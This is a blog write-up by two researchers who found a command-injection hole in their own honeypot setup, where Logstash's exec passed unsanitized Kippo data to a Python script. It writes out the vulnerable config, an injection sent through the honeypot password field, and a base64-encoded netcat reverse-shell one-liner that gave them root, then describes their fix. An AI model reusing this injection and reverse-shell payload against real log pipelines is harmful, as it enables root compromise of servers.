---
id: 347
title: Compromising a honeypot network through the Kippo password when logstash exec is used
date: 2015-08-22T11:59:08+01:00
author: wesley
layout: post
permalink: /2015/08/compromising-a-honeypot-network-through-the-kippo-password-when-logstash-exec-is-used/
---
This is a shared post by [@rikvduijn](http://www.twitter.com/rikvduijn) and [@wez3forsec](http://www.twitter.com/wez3forsec).

We have been playing with Honeypots lately (shoutout to Theo and Sebastian for adding their honeypots to the network), collecting and visualizing the data from the honeypots is done via ELK. The environment contains a central server to centralize all the collected data from the honeypots that are connected to it. The environment is visualized in the following diagram:

[<img class="alignnone size-full wp-image-348" src="/wp-content/uploads/2015/08/tmo.png" alt="tmo" width="301" height="395" />](/wp-content/uploads/2015/08/tmo.png)

In order to collect interesting data on Dutch IP&#8217;s we run every event through a filter adding [Geo location](https://www.elastic.co/guide/en/logstash/current/plugins-filters-geoip.html) based on IP. After that we run all events that pertain to Dutch IP&#8217;s through a Python script using the logstash function [exec](https://www.elastic.co/guide/en/logstash/current/plugins-inputs-exec.html).

<!--more-->

Wesley had a bad feeling about passing input of the honeypots from Logstash to Python, there was no sanitation. The following line is an example of how the input data is passed to the exec:

{% highlight c %}function:
exec {
  command => "/usr/bin/python /opt/logstash/scripts/main.py '%{clientIP}' '%{message}' >> /opt/logstash/scripts/script.log"<br />
}
{% endhighlight %}

Rik had the feeling that all &#8220;evil&#8221; input from the honeypots would be nicely encapsulated in JSON. What Rik did not think trough is that characters in JSON have a different locution than on the commandline. In order to figure out how the input was used we chose to test it. First just from the commandline, calling python with the raw event data from logstash.

{% highlight python %}
python main.py '127.0.0.1' '{"message":"{\"peerIP\": \"xx.245.xx.204\", \"commands\": [], \"loggedin\": null, \"version\": \"SSH-2.0-libssh2_1.4.1\", \"ttylog\": null, \"urls\": [], \"hostIP\": \"127.0.0.1\", \"peerPort\": 39277, \"session\": \"e8dba2e567e34f84b983e8f65810fd54\", \"startTime\": \"2015-08-05T23:27:07.407834\", \"hostPort\": 22, \"credentials\": [[\"nickname\", \"nickname\"], [\"name\", \"name\"]], \"endTime\": \"2015-08-05T23:27:10.215302\", \"unknownCommands\": []}","@version":"1","@timestamp":"2015-08-05T21:27:09.671Z","host":"localhost","chan":"kippo.sessions","name":"cc82a86a-3491-11e5-8589-000c29e0a40d","peerIP":"xx.245.xx.204","commands":[],"loggedin":null,"version":"SSH-2.0-libssh2_1.4.1","ttylog":null,"urls":[],"hostIP":"127.0.0.1","peerPort":39277,"session":"e8dba2e567e34f84b983e8f65810fd54","startTime":"2015-08-05T23:27:07.407834","hostPort":22,"credentials":[["nickname","nickname"],["name","name"]],"endTime":"2015-08-05T23:27:10.215302","unknownCommands":[],"geoip":{"ip":"xx.245.xxx.204","country_code2":"US","country_code3":"USA","country_name":"United States","continent_code":"NA","region_name":"PA","city_name":"Glenshaw","postal_code":"15116","latitude":40.54700000000006,"longitude":-79.988,"dma_code":508,"area_code":412,"timezone":"America/New_York","real_region_name":"Pennsylvania","location":[-79.988,40.54700000000006],"coordinates":[-79.988,40.54700000000006]},"validatedIP":"xx.245.xx.204","valid_ip":"true"}'
{% endhighlight %}
Adding a text to commands should allow us to test if it is vulnerable. We chose to add &#8216;; touch /tmp/testing# as expected this worked. Now we need to do this via a honeypot. We chose Kippo because this allowed us the most input. Filling in the command seemed harder than expected, kippo did not like the input and did not log it to our central server. We hoped kippo would log our input under &#8220;unknownCommands&#8221; but this failed.

After a while we thought what does kippo log every time no matter what: username and password. Supplying the password &#8216;; touch /tmp/testing# we expected a file in tmp. Finding temp with no new file was dissapointing and it was lucky we looked under / finding a file &#8220;tmp, testing&#8221; created by the root user! We now knew that command injection via a honeypot into our ELK host was possible and with root privileges to boot. However Logstash converted our slashes to comma&#8217;s and we do need comma&#8217;s for something like &#8220;nc 192.168.1.1 1234 -e /bin/bash&#8221;. We decided to use base64.

We want to run the command ‘nc.traditional <IP> 4444 -e /bin/bash’, so we encoded this command into base64:

<pre>
echo -n 'nc.traditional 10.10.10.10 4444 -e /bin/bash' | base64
</pre>

This results in the following value:

<pre>
bmMudHJhZGl0aW9uYWwgMTAuMTAuMTAuMTAgNDQ0NCAtZSAvYmluL2Jhc2g=
</pre>

We created a oneliner which takes this value, decodes it and runs its output. The command is the following:

<pre>
'; VAR=bmMudHJhZGl0aW9uYWwgMTAuMTAuMTAuMTAgNDQ0NCAtZSAvYmluL2Jhc2g=; VAR2=$(echo $VAR | base64 -d); $($VAR2);#
</pre>

Let&#8217;s test this, we set up our listener: nc -lvvp 4444 and then ssh into our Kippo honeypot with the user: &#8220;root&#8221; and password:

<pre>
'; VAR=bmMudHJhZGl0aW9uYWwgMTAuMTAuMTAuMTAgNDQ0NCAtZSAvYmluL2Jhc2g=; VAR2=$(echo $VAR | base64 -d); $($VAR2);#
</pre>

Closing the logon session forced kippo to log the data to our ELK server, Logstash passes the input to the commandline injecting our command. We received a reverse root shell.

[<img class="alignnone size-full wp-image-353" src="https://forsec.nl/wp-content/uploads/2015/08/tmpa.png" alt="tmpa" width="816" height="104" />](https://forsec.nl/wp-content/uploads/2015/08/tmpa.png)

[<img class="alignnone size-full wp-image-349" src="https://forsec.nl/wp-content/uploads/2015/08/bqBXfp7.gif" alt="bqBXfp7" width="320" height="240" />](https://forsec.nl/wp-content/uploads/2015/08/bqBXfp7.gif)

The following diagram shows the path the attacker took in order to compromise the centralized honeypot server:

[<img class="alignnone size-full wp-image-350" src="/wp-content/uploads/2015/08/tmp.png" alt="tmp" width="336" height="579" />](/wp-content/uploads/2015/08/tmp.png)

Thinking back on it, it was obvious that passing uncontrolled user input to the commandline was a bad idea. The fact that logstash ran with root privileges was a shock. The way we comprised the ELK while using the exec function, is a quite advanced attack which doesn’t seem to be impossible.  
We fixed our vulnerability by using another way to pass the input to the Python script. We firstly validate our IP-address using the following grok filter:

{% highlight c %}
filter {
grok {
match => { "attackerIP" => "%{IP:validatedIP}" } add_field => { "valid_ip" => "true" }
match => { "peerIP" => "%{IP:validatedIP}" } add_field => { "valid_ip" => "true" }
match => { "remote_host" => "%{IP:validatedIP}" } add_field => { "valid_ip" => "true" }
  }
}
{% endhighlight %}

This prevents the IP to be manipulated with another value.  
The message input, which is the most likely to be manupilated, is written to a file by logstash, the filename is passed to the commandline as an static value. This prevents an attacker to manipulate the command in the exec function using the message input.